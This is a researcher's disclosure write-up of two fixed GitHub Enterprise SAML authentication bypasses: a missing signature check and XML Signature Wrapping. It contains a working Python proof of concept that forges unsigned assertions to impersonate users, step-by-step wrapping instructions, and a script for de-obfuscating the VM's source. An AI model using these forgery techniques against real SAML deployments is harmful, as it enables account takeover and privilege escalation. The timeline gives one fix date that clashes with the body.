=========================================================
The road to your codebase is paved with forged assertions
=========================================================

:date: 2017-03-13
:modified: 2017-03-13 00:10
:tags: SAML, authentication, XSW
:category: bounty
:slug: github-saml
:authors: Ioannis Kakavas
:summary: Authentication bypass using vulnerabilities in the Github Enterprise SAML SP implementation


.. role:: bash(code)
   :language: bash

.. role:: rubyinline(code)
   :language: ruby

.. contents:: Navigation


TL;DR
-------
Two vulnerabilities were identified in the SAML Service Provider implementation of Github Enterprise edition that allowed for full authentication bypass. These vulnerabilities were reported to Github via their `bug bounty program in Hackerone <https://www.hackerone.com/github>`_ and mitigated.

Introduction
----------------

Github Enterprise allows to be configured for authentication `using SAML <https://help.github.com/enterprise/2.9/admin/guides/user-management/using-saml>`_ , acting as a SAML Service Provider for the Organization's on premises SAML Identity Provider. For a short introduction on SAML authentication feel free to take a look in my `previous post <http://www.economyofmechanism.com/office365-authbypass.html#short-saml-introduction>`_ and/or any of the following: `wikipedia <https://en.wikipedia.org/wiki/SAML_2.0#Web_Browser_SSO_Profile>`_, `onelogin saml tutorial <https://developers.onelogin.com/saml>`_, `auth0 saml how-to <https://auth0.com/blog/how-saml-authentication-works/>`_. 

Ever since I heard that Github supported SAML authentication for it's Enterprise edition, I made a mental note to come back an take a look. I was curious about what I might find but because of Github being Github, I didn't expect to uncover anything significant and I gradually forgot about it. Fast forward to this January when `Orange Tsai <https://twitter.com/orange_8361>`_ posted their cool `writeup <http://blog.orange.tw/2017/01/bug-bounty-github-enterprise-sql-injection.html>`_ of the SQL injection vulnerability they discovered in GHE and `this tweet <https://twitter.com/github/status/818548407987945473>`_ from `Github Security <https://twitter.com/GithubSecurity>`_ announcing that they will be giving out some bonuses on the vulnerabilities reported in January and February. Orange's writeup triggered my interest and the bounty bonus functioned as a nice incentive.

This post describes what happened next. The focus will be on how I came about finding the vulnerabilities hoping that you can take something more out of reading this post, rather than just me "bragging" about what I found. 


Setting up the test environment
+++++++++++++++++++++++++++++++

Failing to read the `documentation <https://bounty.github.com/#open-bounties>`_ properly, I didn't know that I could ask for a testing license from Github, so I went and registered for a normal business trial (Apologies to the friendly sales guy who tried to set up a call with me following that - I never had a legitimate interest in buying).

I downloaded the qcow2 image, fired up a VM with 2 cpu and 4 GB ram, and.. nothing. 

.. figure:: /images/ghe1.png
    :alt: Firing up the VM
    :width: 50%

After navigating to `https://192.168.122.244:8443/setup` as instructed, I received the following message informing me that I would need 14 more GB of RAM at least to just bootstrap the installation. 

.. figure:: /images/ghe2.png
    :alt: Grounded by preflight checks
    :width: 50%

Thinking that I won't probably need all of this memory to just test out the SAML implementation, I focused on how to bypass the limitation. A quick search on how to mount and edit a qcow2 image pointed me to libguestfs and `guestfish <http://libguestfs.org/guestfish.1.html>`_ 
After successfully mounting the image, I did a quick search for 'preflight' and luckily enough I stumbled upon `/usr/local/share/enterprise/ghe-preflight-check` which contained all the limits. Changing 

.. code::

 CHECK_REQUIREMENTS = {¬
   default: {memory: 14, blockdev_capacity: 10, rootdev_capacity: 20},¬
 }

to

.. code::

 CHECK_REQUIREMENTS = {¬
  default: {memory: 3, blockdev_capacity: 10, rootdev_capacity: 20},¬
 }

did the trick and I was able to start the VM. 

Getting the source code of the SAML implementation
+++++++++++++++++++++++++++++++++++++++++++++++++++

Building on what Orange had described in the write-up, I proceeded to `scp` the source code from `/data/github/current` to the host machine and used the following script

.. code:: ruby

    require 'zlib'
    require 'fileutils'

    def decrypt(s)
        key = "This obfuscation is intended to discourage GitHub Enterprise customers from making modifications to the VM. We know this 'encryption' is easily broken. "
        i, plaintext = 0, ''
        Zlib::Inflate.inflate(s).each_byte do |c| 
            plaintext << (c ^ key[i%key.length].ord).chr
            i += 1
        end 
        plaintext
    end
    content = File.open(ARGV[0], "r").read
    filename = './decrypted_source/'+ARGV[0]
    if content.include? "ruby_concealer.so"
        content.sub! %Q(require "ruby_concealer.so"\n__ruby_concealer__), " decrypt "
        plaintext = eval content

        dirname = File.dirname('./decrypted_source/'+ARGV[0])
        unless File.directory?(dirname)
              FileUtils.mkdir_p(dirname)
        end 
    else
        plaintext = content
    end

    open(filename,'w') { |f| 
        f.puts plaintext
    }

to de-obfuscate all ruby files with 

.. code::

  find . -iname '*.rb' -exec ruby decrypt.rb '{}' \;





Verifying that everything works
++++++++++++++++++++++++++++++++++
Setting up the SAML authentication was quite easy following the steps in `the docs <https://help.github.com/enterprise/2.9/admin/guides/user-management/using-saml>`_. For the Identity Provider part, I am using a python project based on `pysaml2 <https://pypi.python.org/pypi/pysaml2>`_ that can handle legitimate IdP functionality as well as a number of automated and semi-automated SAML related attacks. Hopefully it will be released soon and will be the topic of another blog post. I created a dummy IdP certificate

.. code:: bash

  openssl req -nodes -x509 -newkey rsa:2048 -keyout idp.key -out idp.crt -days 3650

and I set my Issuer to be https://idp.ikakavas.gr and the authentication endpoint to https://idp.ikakavas.gr/sso/redirect. Note that the domain doesn't have to resolve to something, since all communication is front-channel via the user's browser, a simple entry in `/etc/hosts` pointing to localhost is sufficient for testing.
I set up my Identity Provider to release a NameID with format `urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified` and I was ready to start testing.

I did a test authentication releasing user1 as the NameID in the Subject of the SAML Assertion and verified that everything works as expected. The user was created in my GHE instance (it supports just in time provisioning) and I was successfully logged in. 

The flow is that of a normal SAML Web Browser Single Sign On. 


.. figure:: /images/ghe_saml_flow.png
    :alt: SAML Web SSO flow
    :width: 50%

1. User attempts to access https://192.168.122.244 

2. Since SAML Authentication is enabled and access to the web interface is protected, GHE SAML SP builds an authentication request and redirects the user to the IdP Authentication endpoint with the Authentication Request deflated and urlencoded as a HTTP GET Parameter: 

3. The IdP validates the request and if it "knows" the Issuer proceeds to authenticate the user

4. On successful authentication the IdP constructs a SAMLResponse containing an Assertion with an Authentication Statement and instructs the user browser to post that to the Assertion Consuming Service endpoint of the GHE SAML SP. 

5. The SAML Response's authenticity and validity is verified, the user is extracted from the NameID of the subject in the SAML Assertion and a session is created for them. 

6. The session cookie is set and the user is redirected back to https://192.168.122.244 as an authenticated user.


Attacking the SAML SP Implementation
--------------------------------------

Signature Stripping
++++++++++++++++++++

Overview
`````````

The first thing I tried was to disable signing the SAML Response and the SAML Assertion that my Identity Provider was sending to the GHE Service Provider. I did that more for due diligence so that I can move on to more promising test cases and almost couldn't believe it when the authentication succeeded. 

If you were too bored to refresh your SAML knowledge above, the equivalent of a Service Provider accepting unsigned SAML assertions is accepting a username without checking the password. Effectively on the flow described above, on step 5, GHE SAML SP accepted any SAML Assertion assuming it was well formed and valid without checking it's authenticity.

So, in 30 mins time (counting the time it took to figure out how to run the VM with less than 14GB of RAM) I had a very serious bug in my hands. The impact of it was quite severe:

* An external or internal attacker would be able to authenticate as any existing user to a GHE instance. 

* An external or internal attacker would be able to create arbitrary users in a given GHE instance, even with elevated privileges (`setting the administrator attribute <https://help.github.com/enterprise/2.9/admin/guides/user-management/using-saml/#saml-attributes>`_)

* An internal attacker would be able to elevate their privileges by setting the administrator attribute to true for their account. 


The thing is that signature verification is a very fundamental part of SAML SSO and I was too surprised and intrigued that this was not checked at all. I had to submit a report in Hackerone, but first I needed to know why. 

Details
```````

A few greps later, I figured out that the SAML implementation is contained within the `/data/github/current/lib/saml` directory. Ruby is not my strong point but the code seemed straightforward enough. A quick grep for `signature` left me more perplexed than before as I could see that there are code paths to handle the verification of the Signatures in the SAML Response

The verification process for an incoming SAML Response starts at `/data/github/current/lib/github/authentication/saml.rb` which deals with the HTTP POST request to the Assertion Consuming Service Endpoint and specifically in the :rubyinline:`get_auth_failure_result` method

.. code:: ruby

          def get_auth_failure_result(saml_response, request, log_data)
            unless saml_response.in_response_to || idp_initiated_sso? || ::SAML.mocked[:skip_in_response_to_check]
              return GitHub::Authentication::Result.external_response_ignored
            end
            unless saml_response.valid?(
              :issuer => configuration[:issuer],
              :idp_certificate => idp_certificate,
              :sp_url => configuration[:sp_url]
            )
              log_auth_validation_event(log_data, "failure - Invalid SAML response", saml_response, request.params)
              return GitHub::Authentication::Result.failure :message => INVALID_RESPONSE
            end

            if saml_response.request_denied?
              log_auth_validation_event(log_data, "failure - RequestDenied", saml_response, request.params)
              return GitHub::Authentication::Result.failure :message => saml_response.status_message || REQUEST_DENIED_RESPONSE
            end

            unless saml_response.success?
              log_auth_validation_event(log_data, "failure - Unauthorized", saml_response, request.params)
              return GitHub::Authentication::Result.failure :message => UNAUTHORIZED_RESPONSE
            end

            if request_tracking? && !in_response_to_request?(saml_response, request)
              log_auth_validation_event(log_data, "failure - Unauthorized - In Response To invalid", saml_response, request.params)
              return GitHub::Authentication::Result.failure :message => UNAUTHORIZED_RESPONSE
            end
          end

The interesting part starts when `valid?` is called:

.. code:: ruby

            unless saml_response.valid?(
              :issuer => configuration[:issuer],
              :idp_certificate => idp_certificate,
              :sp_url => configuration[:sp_url]
            )
              log_auth_validation_event(log_data, "failure - Invalid SAML response", saml_response, request.params)
              return GitHub::Authentication::Result.failure :message => INVALID_RESPONSE
            end

The `valid?` method of `saml_response` actually calls `validate` from of the `Message` class (`/lib/saml/message.rb`)

.. code:: ruby

        # Public: Validates schema and custom validations.
        #   
        # Returns false if instance is invalid. #errors will be non-empty if
        # invalid.
        def valid?(options = {}) 
          errors.clear
          validate_schema && validate(options)
          errors.empty?
        end 

and in turn `validate` method called above is implemented in `Response` class, that implements `Message` in `/data/github/current/lib/saml/message/response.rb`

.. code:: ruby

    def validate(options)
        if !SAML.mocked[:skip_validate_signature] && options[:idp_certificate]
          validate_has_signature
          validate_signatures(options[:idp_certificate])
        end
        validate_issuer(options[:issuer])
        validate_destination(options[:sp_url])
        validate_recipient(options[:sp_url])
        validate_conditions
        validate_audience(options[:sp_url])
        validate_name_id_format(options[:name_id_format])
    end

So I ended here and I had no clear way of knowing whether `validate_has_signature` and `validate_signatures` where executed or not. `SAML.mocked` would need to have been set to true somewhere and this would affect everything which seemed rather improbable, and I was certain that the `idp_certificate` was set since one cannot complete the SAML configuration part in the admin UI without setting this. 


The only way to know was to debug the functionality, the way debugging was meant to be done: Print statements. Jokes aside, having limited exposure to Ruby and unicorn adding `puts` or `pp` statements was the easiest way for me to get some insights at that point.  

So I replaced the obfuscated code with the de-obfuscated version of `/data/github/current/lib/saml/message/response.rb` and changed the following

.. code:: ruby

    def validate(options)
        pp options[:idp_certificate]
        if !SAML.mocked[:skip_validate_signature] && options[:idp_certificate]
          puts 'Going to validate the signature'
          validate_has_signature
          validate_signatures(options[:idp_certificate])
        end
    ...

Next I had to figure out what runs the ruby application, so that I would know which logs to check for for the output. 

I started of by seeing what listens on port 443 and figured out that it is haproxy that then passes on the request to nginx which then passes it to unicorn. 
Using `systemctl list-units` I then found that the name of the service is github-unicorn and from the `data/github/current/config/unicorn.rb` file the location of the log file at `/var/log/githib/unicorn.log`

Armed with the knowledge above, I restarted the service, performed an authentication and took a look at the log to see what's going on and saw the following:

.. code:: ruby

 {:issuer=>"https://idp.ikakavas.gr",
  :idp_certificate=>nil,
  :sp_url=>"https://192.168.122.244"}

Since `:idp_certificate` was nil, :rubyinline:`!SAML.mocked[:skip_validate_signature] && options[:idp_certificate]` validated to false, and `validate_has_signature` and `validate_signatures` that would actually check the validity of the signatures were never executed!!  

Digging deeper to the source of the issue and the actual bug, I traced back to `/data/github/current/lib/github/authentication/saml.rb` where the `valid` is called

.. code:: ruby

    unless saml_response.valid?(
      :issuer => configuration[:issuer],
      :idp_certificate => idp_certificate,
      :sp_url => configuration[:sp_url]
    )

and the method `idp_certificate`. It looks like this:

.. code:: ruby

     # Public: Returns a string containing the IdP certificate or nil.
      def idp_certificate
        @idp_certificate ||= if configuration[:idp_certificate]
          configuration[:idp_certificate]
        elsif configuration[:idp_certificate_path]
          File.read(configuration[:idp_certificate_path])
        end
      end 

I kept staring at it, and nothing seemed off. I couldn't spot any error so "puts to the rescue!"
A few minutes later (unicorn restart took quite some time with 4GB of RAM) I was looking at what the configuration Hash looked like

.. code:: ruby

    {:sso_url=>"http://idp.ikakavas.gr/sso",
     :idp_initiated_sso=>false,
     :disable_admin_demote=>false,
     :issuer=>"https://idp.ikakavas.gr",
     :signature_method=>"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256",
     :digest_method=>"http://www.w3.org/2000/09/xmldsig#sha1",
     :idp_certificate_file=>"/data/user/common/idp.crt",
     :sp_pkcs12_file=>"/data/user/common/saml-sp.p12",
     :admin=>nil,
     :profile_name=>nil,
     :profile_mail=>nil,
     :profile_key=>nil,
     :profile_gpg_key=>nil,
     :sp_url=>"https://192.168.122.244"}

The bug was staring me in the face. And it was a simple one. 

The configuration Hash has a property called `idp_certificate_file` and the code in  `/data/github/current/lib/github/authentication/saml.rb` attempted to get the `idp_certificate_path`. This returned `nil` and effectively disabled all SAML message integrity/authenticity protection.

PoC
``````

I wrote up the above and created the following PoC so that they could validate the issue easily:

.. code:: python

    import requests, urllib, zlib, base64, re, datetime, pprint
    from urlparse import parse_qs
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    # Change this to reflect your GHE setup
    URL ='https://192.168.122.244/login?return_to=https%3A%2F%2F192.168.122.244%2F'
    ISSUER = 'https://idp.ikakavas.gr'
    RECIPIENT = 'https://192.168.122.244/saml/consume'
    AUDIENCE = 'https://192.168.122.244'
    # user to impersonate
    NAMEID = 'testuser'

    # Get a client that can handle cookies
    saml_client = requests.session()
    # Make the initial request to trigger the authentication middleware
    # Disallow redirects as we need to catch the Location header and parse it
    response = saml_client.get(URL, verify=False, allow_redirects=False)
    idp_login_url = response.headers['Location']
    # Get the HTTP GET parameters as a dict
    saml_message = (dict([(k, v[0]) for k, v in parse_qs(idp_login_url.split("?")[1]).items()]))
    if 'SAMLRequest' in saml_message and 'RelayState' in saml_message:
        relay_state = saml_message['RelayState']
        encoded_saml_request = saml_message['SAMLRequest']
        # inflate and decode the request
        saml_request = zlib.decompress(urllib.unquote(base64.b64decode(encoded_saml_request)), -15)
        # get the AuthnRequest ID so that we can reply 
        to_reply_to = re.search(r'ID="([_A-Za-z0-9]*)"', saml_request, re.M|re.I).group(1)

        now = '{0}Z'.format(datetime.datetime.utcnow().isoformat().split('.')[0])
        not_after = '{0}Z'.format((datetime.datetime.utcnow()+ datetime.timedelta(minutes = 20)).isoformat().split('.')[0])
        #Now load a dummy SAML Response from file and manipulate necessary fields
        saml_response ='''<?xml version="1.0" encoding="UTF-8"?>
    <ns0:Response Destination="{5}"
      ID="id-ijkXTw5GmzOJrShaq"
      InResponseTo="{0}"
      IssueInstant="{1}" Version="2.0"
      xmlns:ns0="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:ns1="urn:oasis:names:tc:SAML:2.0:assertion">
      <ns1:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity">https://idp.ikakavas.gr</ns1:Issuer>
      <ns0:Status>
        <ns0:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
      </ns0:Status>
      <ns1:Assertion ID="id-MnRkvbCYnZ7YQ9vP5"
        IssueInstant="{1}" Version="2.0">
        <ns1:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity">{2}</ns1:Issuer>
        <ns1:Subject>
          <ns1:NameID
            Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">{3}</ns1:NameID>
          <ns1:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
            <ns1:SubjectConfirmationData
              InResponseTo="{0}"
              NotOnOrAfter="{4}" Recipient="{5}"/>
          </ns1:SubjectConfirmation>
        </ns1:Subject>
        <ns1:Conditions NotBefore="{1}" NotOnOrAfter="{4}">
          <ns1:AudienceRestriction>
            <ns1:Audience>{6}</ns1:Audience>
          </ns1:AudienceRestriction>
        </ns1:Conditions>
        <ns1:AuthnStatement AuthnInstant="{1}" SessionIndex="id-bBMbAuaPOePnBgNTx">
          <ns1:AuthnContext>
            <ns1:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</ns1:AuthnContextClassRef>
          </ns1:AuthnContext>
        </ns1:AuthnStatement>
      </ns1:Assertion>
    </ns0:Response>'''.format(to_reply_to, now, ISSUER, NAMEID, not_after, RECIPIENT, AUDIENCE)
        data = {'SAMLResponse': base64.b64encode(saml_response),
                'RelayState':relay_state}
        #Post the SAML Response to the ACS endpoint
        r = saml_client.post(RECIPIENT, data=data, verify=False, allow_redirects=False)
        # we expect a redirect on successful authentication 
        if 300 < r.status_code < 399:
            # Print the cookies for verification
            pprint.pprint(r.cookies.get_dict())

The above would print out something like the following:

.. code::

 {'_fi_sess': 'eyJsYXN0X3dyaXRlIjoxNDg0MDY0NjMxNzU3LCJmbGFzaCI6eyJkaXNjYXJkIjpbXSwiZmxhc2hlcyI6eyJhbmFseXRpY3NfZGltZW5zaW9uIjp7Im5hbWUiOiJkaW1lbnNpb241IiwidmFsdWUiOiJMb2dnZWQgSW4ifX19LCJzZXNzaW9uX2lkIjoiMzM2OGFiYmFjOGVjMWQxNGZiYjhmNDAzMGRiNWFkZGQifQ%3D%3D--c9219c7ba29e5285a76275c2a0a5dcbb12925fcb',
 '_gh_render': 'BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiRTZlMmNjZTBmN2RjMGM3MDExMGI3%0AMzVkMjcxYjZkOGY5MTQxMTE0Yzg2NDMwOGFkM2EzZDE5OTU1MjJiMTRkMGEG%0AOwBGSSIPdXNlcl9sb2dpbgY7AEZJIg10ZXN0dXNlcgY7AFQ%3D%0A--ae525ab90dee2157dec9890cdb147c569ff5e6b8',
 'dotcom_user': 'testuser',
 'logged_in': 'yes',
 'user_session': 'yoF_AlS0VMFsZjBzj8mLF9Wk_Ne1YpCv57y_T1rTy-FEfD_dWHUHd3pqz07hXxODk0hhms_8gVxICuBQ'}

and setting the `user_session` session cookie in a browser would log the attacker in as the impersonated user. 

Disclosure
````````````

I submitted the report via Hackerone on January 10th. I receive and acknowledgement some hours later, the issue was triaged the next day and a new GHE `release <https://enterprise.github.com/releases/2.8.6/notes>`_ was out on January 12th.



XML Signature Wrapping Attacks
+++++++++++++++++++++++++++++++++ 

Next weekend I found myself with some time to spare so I thought I'd give my testing software another spin in order to look for more issues. I have a test suite that would attempt all attacks described in the `2012 paper <https://www.usenix.org/conference/usenixsecurity12/technical-sessions/presentation/somorovsky>`_

Running the tool, it reported quite quickly that the implementation is vulnerable to a specific XML Signature Wrapping (XSW) attack, caused by the fact that the part that validates the signature and the part that implements business logic have different views on the data.

GHE SAML SP implementation was vulnerable to a crafted SAML Response that contains two SAML Assertions. Assuming the Legitimate Assertion is LA, the Forged Assertion is FA and LAS is the signature of the Legitimate Assertion, the malicious crafted SAML Response would look like this:

::

 <SAMLRespone>
   <FA ID="evil">
       <Subject>Attacker</Subject>
   </FA>
   <LA ID="legitimate">
       <Subject>Legitimate User</Subject>
       <LAS>
          <Reference Reference URI="legitimate">
          </Reference>
       </LAS>
   </LA>
 </SAMLResponse>

Upon receiving such a SAML response, GHE would successfully verify and consume it creating a session for **Attacker**, instead of **Legitimate User**, even if FA is **not** signed. 

Let's see why GHE is vulnerable to this attack by taking a look at the de-obfuscated source code as before:

The basic problem is that the implementers made an assumption that there will always be only one Assertion in a SAML response.

The verification process for an incoming SAML Response starts at `/data/github/current/lib/github/authentication/saml.rb` in

.. code:: ruby

 def rails_authenticate(request)


where the incoming SAML Message is used to create an instance of `SAML::Message::Response`

.. code:: ruby

    saml_response = ::SAML::Message::Response.from_param(request.params[:SAMLResponse])

`from_param()` from `/data/github/current/lib/saml/message.rb` base64 decodes the response, and then calls build() which in turn calls
parse() from `/data/github/current/lib/saml/message/response.rb`` In `parse()` the
`at\_xpath <http://www.rubydoc.info/github/sparklemotion/nokogiri/Nokogiri/XML/Searchable#at_xpath-instance_method>`__
and
`at <http://www.rubydoc.info/github/sparklemotion/nokogiri/Nokogiri/XML/Searchable#at-instance_method>`__
methods of `Nokogiri <www.nokogiri.org>`__ are used extensively in order
to search in the SAML Response for a given XPath and assign the text
value of the node to a variable.

This is the first part of the problem and this is how the business logic
gets its view of the SAML Response. Since `at_xpath` and `at` have
the well documented property of matching and retrieving **only** the
first result, no matter how many results are there, all variables below

.. code:: ruby

    issuer = d.at_xpath("//Response/Issuer") && d.at_xpath("//Response/Issuer").text
    issuer ||= d.at_xpath("//Response/Assertion/Issuer") && d.at_xpath("//Response/Assertion/Issuer").text
    status_code = d.at_xpath("//Response/Status/StatusCode")
    second_level_status_code = d.at_xpath("//Response/Status/StatusCode/StatusCode")
    status_message = d.at_xpath("//Response/Status/StatusMessage")
    authn = d.at_xpath("//AuthnStatement")
    conditions = d.at_xpath("//Response/Assertion/Conditions")
    audience_text = d.at_xpath("//Response/Assertion/Conditions/AudienceRestriction") && d.at_xpath("//Response/Assertion/Conditions/AudienceRestriction/Audience") && d.at_xpath("//Response/Assertion/Conditions/AudienceRestriction/Audience").text
    attribute_statements = d.at_xpath("//Response/Assertion/AttributeStatement")
    subject = d.at_xpath("//Subject") && d.at_xpath("//Subject").text
    name_id = d.at_xpath("//Subject/NameID") && d.at_xpath("//Subject/NameID").text
    name_id_format = d.at_xpath("//Subject/NameID") && d.at_xpath("//Subject/NameID")["Format"]
    subj_conf_data = d.at_xpath("//Subject/SubjectConfirmation") && d.at_xpath("//Subject/SubjectConfirmation/SubjectConfirmationData")

would take their values from the Forged Assertion(!!!) since it was the first child of the SAML Response document.

Now that the Response object is built, `get_auth_failure_result(saml_response, request, log_data)` is called as we've seen above also

.. code:: ruby

            unless saml_response.valid?(
              :issuer => configuration[:issuer],
              :idp_certificate => idp_certificate,
              :sp_url => configuration[:sp_url]
            )
              log_auth_validation_event(log_data, "failure - Invalid SAML response", saml_response, request.params)
              return GitHub::Authentication::Result.failure :message => INVALID_RESPONSE
            end

The `valid?` method of `saml_response` actually calls validate from /lib/saml/message.rb

.. code:: ruby

        # Public: Validates schema and custom validations.
        #   
        # Returns false if instance is invalid. #errors will be non-empty if
        # invalid.
        def valid?(options = {}) 
          errors.clear
          validate_schema && validate(options)
          errors.empty?
        end 

and `validate` is implemented in `/data/github/current/lib/saml/message/response.rb`

.. code:: ruby

    def validate(options)
        if !SAML.mocked[:skip_validate_signature] && options[:idp_certificate]
          validate_has_signature
          validate_signatures(options[:idp_certificate])
        end
        validate_issuer(options[:issuer])
        validate_destination(options[:sp_url])
        validate_recipient(options[:sp_url])
        validate_conditions
        validate_audience(options[:sp_url])
        validate_name_id_format(options[:name_id_format])
    end

Here is where the second part of the problem manifests and where the signature verification logic gets its view of the SAML Response:

`validate_has_signature` looks like this:

.. code:: ruby

    def validate_has_signature
        namespaces = {
          "ds" => "http://www.w3.org/2000/09/xmldsig#",
          "saml2p" => "urn:oasis:names:tc:SAML:2.0:protocol",
          "saml2" => "urn:oasis:names:tc:SAML:2.0:assertion"
        }
        unless document.at("//saml2p:Response/ds:Signature", namespaces) ||
               document.at("//saml2p:Response/saml2:Assertion/ds:Signature", namespaces)
          self.errors << "Message is not signed. Either the assertion or response or both must be signed."
        end
      end

``//saml2p:Response/saml2:Assertion/ds:Signature`` matches the legitimate assertion just fine so the method does not add anything to self.errors

Then, `validate_signatures`

.. code:: ruby

    def validate_signatures(certificate)
        certificate = OpenSSL::X509::Certificate.new(certificate)
        unless signatures.all? { |signature| signature.valid?(certificate) }
          puts "digest mismatch"
          self.errors << "Digest mismatch"
        end
      end

uses `signatures` that comes from ``/data/github/current/lib/saml/message.rb``

.. code:: ruby

    def signatures
      signatures = document.xpath("//ds:Signature", Xmldsig::NAMESPACES)
      signatures.reverse.collect do |node|
        Xmldsig::Signature.new(node)
      end || []
    end 

which matches the signature of the Legitimate Assertion in our forged SAML Response since it's the only one there and ``valid?`` from
``Xmldsig::Signature`` validates successfully the signature against the Identity Provider signing certificate (public key) since the legitimate assertion did come from the valid IdP.

Back to ``validate`` of ``response.rb``, all of the below

.. code:: ruby

        validate_issuer(options[:issuer])
        validate_destination(options[:sp_url])
        validate_recipient(options[:sp_url])
        validate_conditions
        validate_audience(options[:sp_url])
        validate_name_id_format(options[:name_id_format])

would return true as they operate on data of the Forged Assertion and the attacker can freely control them to be valid.

PoC - Steps to reproduce
`````````````````````````````

The code/toolset that I was using for testing is not yet in a form to be released/shared (hopefully soon) so I used `SAML Raider <https://github.com/SAMLRaider/SAMLRaider>`_ in order to describe a PoC with steps to be reproduced by Github Security team.

1.  Set up GHE for SAML authentication with a SAML Identity Provider of
    your liking.

2.  Install Burp Suite and SAML Raider plugin and start Burp Suite

3.  Configure your browser to use Burp Suite as proxy

4.  Start the login process to GHE

5.  Intercept the SAML Authn Request and forward
        
    .. figure:: /images/xsw1.png
        :alt: SAML Authentication Request
        :width: 80%

6.  Login at your Identity Provider as a valid user

7.  Intercept the SAML Response
    
    .. figure:: /images/xsw2.png
        :alt: SAML Authentication Response
        :width: 80%

8.  In the SAML Raider window select XSW3 from the available attacks and
    click on "Apply XSW"

9.  Check the SAML response below to see that it is changed, and change
    the name in the Subject of the Assertion with ID
    ``_evil_assertion_ID`` to something else ( i.e. "victim_account")

    .. figure:: /images/xsw3.png
        :alt: Forge Assertion
        :width: 80%

10. Click Forward and check that you are logged in as ``victim_account``

    .. figure:: /images/xsw4.png
        :alt: Logged in as victim
        :width: 80%

Exploitability
```````````````
An attacker can bypass authentication given one of the following is true

1. The attacker is an existing user of a GHE instance that uses SAML authentication.

2. The attacker is an existing user of a SAML Identity Provider that is configured as a trusted Identity Provider for a GHE instance that
   uses SAML authentication

3. Or the attacker can get their hands on a valid signed assertion
   (*only* the signature needs to be valid, the rest can be anything)
   from a SAML Identity Provider that is configured as a trusted
   Identity Provider for a GHE instance that uses SAML authentication.
   Note that this assertion destination can be any other SAML Service
   Provider. Possible sources for this can be Identity Provider logs,
   other Service Provider logs, mailing list archives, StackOverflow
   Questions , etc.

Note that an external attacker has the inherent difficulty as they would need a valid Assertion from a trusted Identity Provider in order to mount the attack. However the fact that the Assertion can be

- expired

- or even destined to another Service Provider

significantly raises the chances.


Impact
``````

-  An external attacker taking advantage of this can authenticate to a GHE instance as any user

-  An internal attacker taking advantage of this can authenticate to a GHE instance as any user

-  An internal attacker taking advantage of this can elevate their rights to admin in a GHE instance

Disclosure
``````````

I reported this to Github security via Hackerone on 16th of January. It was acknowledged and triaged after a couple of hours and resolved on January 31st with GHE version `2.8.7 <https://enterprise.github.com/releases/2.8.7/notes>`_ 


Timeline
---------

- 2017-01-10: Incorrect XML Signature validation vulnerability discovered and reported

- 2017-01-10: Report acknowledged

- 2017-01-11: Report triaged

- 2017-01-12: Mitigation released with v. 2.8.6 and bounty awarded

- 2017-01-16: XSW vulnerability discovered and reported

- 2017-01-16: Report acknowledged and triaged

- 2017-01-27: Asked for update on mitigation/release

- 2017-01-12: Mitigation released with v. 2.8.7 and bounty awarded


Full SAML Implementation Assessment
------------------------------------

Following the above reports I received a research grant in order to continue looking into Github's SAML implementation. I performed a full (to the extend that the agreed timeframe and my off-work availability allowed) security audit which uncovered a couple of minor issues and a set of suggestions/recommendations about the implementation in order to minimize the possibility of similar issues in the future. 


Outro
------

I enjoyed finding and writing these so I hope if you made it through to the end, you did too. Working with the Github Security guys was a bliss and I can verify first hand that their approach towards their bounty program is as serious and as cool as they describe it on their recent `blog post <https://githubengineering.com/githubs-bug-bounty-workflow/>`_


